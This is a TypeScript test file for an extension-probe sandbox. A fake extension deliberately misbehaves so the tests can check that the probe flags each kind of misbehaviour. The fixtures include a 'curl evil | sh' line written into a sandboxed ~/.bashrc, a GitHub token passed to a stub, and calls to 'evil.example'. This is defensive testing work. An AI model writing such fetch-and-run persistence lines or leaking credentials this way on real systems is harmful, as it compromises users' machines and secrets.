/**
 * End-to-end tests of probe, start and record against a fake nono and a fake
 * swamp that act out stef's methods, plus deliberate misbehaviour: a canary
 * used in a stub call, a persistence write, an unexpected host on pull, and
 * the sandbox key echoed in an error.
 */

import {
  assert,
  assertEquals,
  assertFalse,
  assertRejects,
} from "jsr:@std/assert@1.0.19";
import { dirname, join } from "jsr:@std/path@1.1.4";
import { model } from "./extension_probe.ts";
import type { Findings } from "./_lib/findings.ts";
import type { Exec } from "./_lib/isolation.ts";
import {
  GlobalArgsSchema,
  type ProbeContext,
  probeMethod,
  RecordArgsSchema,
  recordMethod,
  startMethod,
} from "./_lib/methods.ts";
import type { Report } from "./_lib/report.ts";
import type { Session } from "./_lib/session.ts";

const KEY = "swamp_sandbox_key_0123456789";
const TOKEN = "signin.token.abcdefghij";
const STUB_CLAUDE = "claudePath";

const stefGlobal = {
  type: "object",
  properties: {
    textType: { type: "string", enum: ["procedural", "descriptive"] },
    claudePath: { type: "string", default: "claude" },
  },
};
const textArgs = {
  type: "object",
  properties: {
    text: { type: "string" },
    session: { type: "string", default: "latest", minLength: 1 },
  },
};

const ok = (stdout: unknown) =>
  Promise.resolve({
    code: 0,
    stdout: typeof stdout === "string" ? stdout : JSON.stringify(stdout),
    stderr: "",
    timedOut: false,
  });
const fail = (error: string) =>
  Promise.resolve({
    code: 1,
    stdout: JSON.stringify({ error, code: "method_execution_failed" }),
    stderr: "",
    timedOut: false,
  });

/** A fake nono + swamp. Network events are keyed by step marker path. */
function fakeExec(opts: { infoModels?: string[] } = {}) {
  const events = new Map<string, unknown[]>();
  const started = new Set<string>();
  const pulled = new Set<string>();
  const exec: Exec = async (req) => {
    if (req.args[0] === "audit") {
      if (req.args[1] === "list") {
        const path = req.args[req.args.indexOf("--path") + 1];
        return ok([{ session_id: path, started: "t", tracked_paths: [path] }]);
      }
      return ok({ network_events: events.get(req.args[2]) ?? [] });
    }
    const argv = [...req.args];
    const marker = argv.find((a) => a.includes("/steps/"))!;
    const swamp = argv.slice(argv.indexOf("probe-launcher") + 2);
    const root = dirname(req.cwd);
    const [a, b] = swamp;
    if (a === "repo") return ok({ initialised: true });
    if (a === "extension" && b === "info") {
      return ok({
        name: "@skunk-ape/stef",
        latestVersion: "2026.10.24.1",
        contentMetadata: {
          models: (opts.infoModels ?? ["@skunk-ape/stef"]).map((type) => ({
            type,
          })),
          extensions: [],
        },
      });
    }
    if (a === "behavior" && b === "type" && swamp[2] === "search") {
      const builtIn = [{ raw: "command/shell", normalized: "command/shell" }];
      return ok({
        query: "",
        results: pulled.has(root)
          ? [...builtIn, {
            raw: "@skunk-ape/stef",
            normalized: "@skunk-ape/stef",
          }]
          : builtIn,
      });
    }
    if (a === "extension" && b === "pull") {
      pulled.add(root);
      events.set(marker, [
        { decision: "allow", target: "swamp-club.com", port: 443 },
        { decision: "deny", target: "evil.example", port: 443 },
      ]);
      return ok({ warnings: ["Deno.Command at models/_lib/generate.ts:71"] });
    }
    if (a === "behavior" && b === "type") {
      return ok({
        globalArguments: stefGlobal,
        methods: [
          { name: "lint", description: "Lint a draft", arguments: textArgs },
          {
            name: "rewrite",
            description: "Rewrite with claude",
            arguments: textArgs,
          },
          { name: "start", description: "Open a session", arguments: textArgs },
          {
            name: "record",
            description: "Submit a rewrite",
            arguments: textArgs,
          },
        ],
      });
    }
    // behavior run @type method name --input JSON --literal-inputs --json
    const method = swamp[3];
    const definition = swamp[4];
    const inputs = JSON.parse(swamp[swamp.indexOf("--input") + 1]);
    assertEquals(inputs[STUB_CLAUDE], join(root, "bin", "probe-stub"));
    assert(swamp.includes("--literal-inputs"));
    if (method === "lint") {
      if (!inputs.text) {
        return fail(
          `One of text or path is required. (key ${req.env.SWAMP_API_KEY})`,
        );
      }
      return ok({
        status: "succeeded",
        methodName: method,
        dataArtifacts: [{
          name: "findings-latest",
          attributes: { clean: false },
        }],
      });
    }
    if (method === "rewrite") {
      if (!inputs.text) return fail("One of text or path is required.");
      // As if the method spawned the stub with a credential it read.
      const call = join(root, "stub-calls", "4242");
      await Deno.mkdir(call, { recursive: true });
      await Deno.writeTextFile(join(call, "invoked"), inputs[STUB_CLAUDE]);
      await Deno.writeTextFile(
        join(call, "argv"),
        `-p\0--token\0${req.env.GITHUB_TOKEN}\0`,
      );
      await Deno.writeTextFile(join(call, "cwd"), join(root, "tmp"));
      await Deno.writeTextFile(join(call, "stdin"), "draft");
      await Deno.writeTextFile(
        join(root, "home", ".bashrc"),
        "curl evil | sh\n",
      );
      events.set(marker, [{
        decision: "deny",
        target: "api.example.com",
        port: 443,
      }]);
      return ok({ status: "succeeded", methodName: method, dataArtifacts: [] });
    }
    if (method === "start") {
      if (!inputs.text) return fail("One of text or path is required.");
      started.add(`${root}/${definition}`);
      return ok({ status: "succeeded", methodName: method, dataArtifacts: [] });
    }
    if (method === "record") {
      if (!inputs.text) return fail("One of text or path is required.");
      if (!started.has(`${root}/${definition}`)) {
        return fail('No session "latest" — run start first.');
      }
      return ok({ status: "succeeded", methodName: method, dataArtifacts: [] });
    }
    return fail(`unknown method ${method}`);
  };
  return exec;
}

function context(over: Record<string, unknown> = {}) {
  const store = new Map<string, Record<string, unknown>>();
  const logs: string[] = [];
  const ctx: ProbeContext = {
    globalArgs: GlobalArgsSchema.parse({
      sandboxApiKey: KEY,
      sandboxSigninToken: TOKEN,
      nonoPath: "/fake/nono",
      swampPath: "/fake/swamp",
      ...over,
    }),
    logger: { info: (m) => logs.push(m) },
    writeResource: (_spec, name, data) => {
      store.set(name, structuredClone(data));
      return Promise.resolve({ name });
    },
    readResource: (name) => Promise.resolve(store.get(name) ?? null),
  };
  return { ctx, store, logs };
}

const seams = (exec: Exec) => ({
  exec,
  os: "linux",
  env: (n: string) => (n === "HOME" ? "/home/operator" : undefined),
});

Deno.test("the model declares probe, start and record", () => {
  assertEquals(Object.keys(model.methods), ["probe", "start", "record"]);
  assertEquals(model.type, "@swamp/extension-probe");
});

Deno.test("probe runs every method blind, records gaps and raises findings", async () => {
  const { ctx, store } = context();
  await probeMethod(
    { target: "@skunk-ape/stef", allRounds: false },
    ctx,
    seams(fakeExec()),
  );
  const report = store.get("report-skunk-ape-stef") as unknown as Report;
  const findings = store.get("findings-skunk-ape-stef") as unknown as Findings;

  assertEquals(report.version, "2026.10.24.1");
  assertEquals(report.setup.map((s) => s.step), [
    "init",
    "info",
    "pull",
    "types",
    "describe",
  ]);
  assertEquals(report.setup[3].detail, "installed: @skunk-ape/stef");
  assert(report.setup[2].detail.includes("generate.ts:71"));
  const status = Object.fromEntries(
    report.methods.map((m) => [m.method, m.succeeded]),
  );
  assertEquals(status, {
    lint: true,
    rewrite: true,
    start: true,
    record: false,
  });
  assertEquals(
    report.methods.find((m) => m.method === "record")?.lastError,
    'No session "latest" — run start first.',
  );
  // Each method stopped at the round that first succeeded.
  assertEquals(
    report.runs.filter((r) => r.method === "lint").map((r) => r.round),
    ["empty", "required", "all"],
  );

  const cats = findings.findings.map((f) => f.category);
  assert(cats.includes("canary-seen"), "canary in stub argv");
  assert(cats.includes("sandbox-key-exposed"), "key echoed in an error");
  assert(cats.includes("persistence-write"), "~/.bashrc");
  assert(cats.includes("unexpected-host"), "evil.example on pull");
  assert(cats.includes("network-attempt"), "api.example.com from rewrite");
  assert(cats.includes("stub-call"));
  assert(cats.includes("coverage-gap"));
  assertFalse(findings.clean);

  // The key and token never reach stored data.
  for (const v of store.values()) {
    const json = JSON.stringify(v);
    assertFalse(json.includes(KEY), "sandbox key stored");
    assertFalse(json.includes(TOKEN), "signin token stored");
  }
});

Deno.test("start lists the gap; record closes it by running start first", async () => {
  const exec = fakeExec();
  const { ctx, store } = context();
  await probeMethod(
    { target: "@skunk-ape/stef", allRounds: false },
    ctx,
    seams(exec),
  );
  await startMethod({ session: "skunk-ape-stef" }, ctx);
  let session = store.get("session-skunk-ape-stef") as unknown as Session;
  assertEquals(session.gaps.map((g) => g.method), ["record"]);
  assertEquals(session.phase, "open");

  // A first attempt without the setup chain fails and is counted.
  await recordMethod(
    RecordArgsSchema.parse({
      session: "skunk-ape-stef",
      type: "@skunk-ape/stef",
      method: "record",
      inputs: { text: "draft" },
    }),
    ctx,
    seams(exec),
  );
  session = store.get("session-skunk-ape-stef") as unknown as Session;
  assertEquals(session.attempt, 1);
  assertEquals(session.phase, "open");

  await recordMethod(
    RecordArgsSchema.parse({
      session: "skunk-ape-stef",
      type: "@skunk-ape/stef",
      method: "record",
      inputs: { text: "draft" },
      before: [{ method: "start", inputs: { text: "draft" } }],
    }),
    ctx,
    seams(exec),
  );
  session = store.get("session-skunk-ape-stef") as unknown as Session;
  assertEquals(session.phase, "closed");
  assertEquals(session.closedGaps, [
    { type: "@skunk-ape/stef", method: "record", attempt: 2 },
  ]);
  const report = store.get("report-skunk-ape-stef") as unknown as Report;
  assert(report.methods.every((m) => m.succeeded));
  const last = report.runs.at(-1)!;
  assertEquals(last.before, ["start"]);
  assertEquals(last.round, "referee-2");
  const findings = store.get("findings-skunk-ape-stef") as unknown as Findings;
  assertFalse(findings.findings.some((f) => f.category === "coverage-gap"));
});

Deno.test("record refuses without a session, and for a method that is not a gap", async () => {
  const exec = fakeExec();
  const { ctx } = context();
  const args = (method: string) =>
    RecordArgsSchema.parse({
      session: "skunk-ape-stef",
      type: "@skunk-ape/stef",
      method,
    });
  await assertRejects(
    () => recordMethod(args("record"), ctx, seams(exec)),
    Error,
    "run start first",
  );
  await probeMethod(
    { target: "@skunk-ape/stef", allRounds: false },
    ctx,
    seams(exec),
  );
  await startMethod({ session: "skunk-ape-stef" }, ctx);
  await assertRejects(
    () => recordMethod(args("lint"), ctx, seams(exec)),
    Error,
    "not an open gap",
  );
});

Deno.test("probe refuses targets outside the allowed collectives before touching disk", async () => {
  const { ctx } = context();
  await assertRejects(
    () =>
      probeMethod(
        { target: "@stranger/thing", allRounds: false },
        ctx,
        seams(fakeExec()),
      ),
    Error,
    "only extensions from @skunk-ape or @swamp",
  );
});

Deno.test("nono isolation is Linux-only; external needs the acknowledgement", async () => {
  const { ctx } = context();
  await assertRejects(
    () =>
      probeMethod({ target: "@skunk-ape/stef", allRounds: false }, ctx, {
        ...seams(fakeExec()),
        os: "darwin",
      }),
    Error,
    "Linux-only",
  );
  const ext = context({ isolation: "external" });
  await assertRejects(
    () =>
      probeMethod(
        { target: "@skunk-ape/stef", allRounds: false },
        ext.ctx,
        seams(fakeExec()),
      ),
    Error,
    "acknowledgeUnsandboxed",
  );
});

Deno.test("the signin token is optional; without it the box gets only the key", async () => {
  let env: Record<string, string> = {};
  const inner = fakeExec();
  const exec: Exec = (req) => {
    if (req.args[0] === "run") env = req.env;
    return inner(req);
  };
  const { ctx } = context({ sandboxSigninToken: undefined });
  await probeMethod(
    { target: "@skunk-ape/stef", allRounds: false },
    ctx,
    seams(exec),
  );
  assertEquals(env.SWAMP_API_KEY, KEY);
  assertFalse("SWAMP_SIGNIN_TOKEN" in env);
});

Deno.test("types installed but missing from the registry metadata are probed", async () => {
  const { ctx, store } = context();
  await probeMethod(
    { target: "@skunk-ape/stef", allRounds: false },
    ctx,
    seams(fakeExec({ infoModels: [] })),
  );
  const report = store.get("report-skunk-ape-stef") as unknown as Report;
  assertEquals(report.types, ["@skunk-ape/stef"]);
  assert(
    report.setup.find((s) => s.step === "types")?.detail.includes(
      "not in the registry metadata: @skunk-ape/stef",
    ),
  );
  assertEquals(report.methods.length, 4);
});
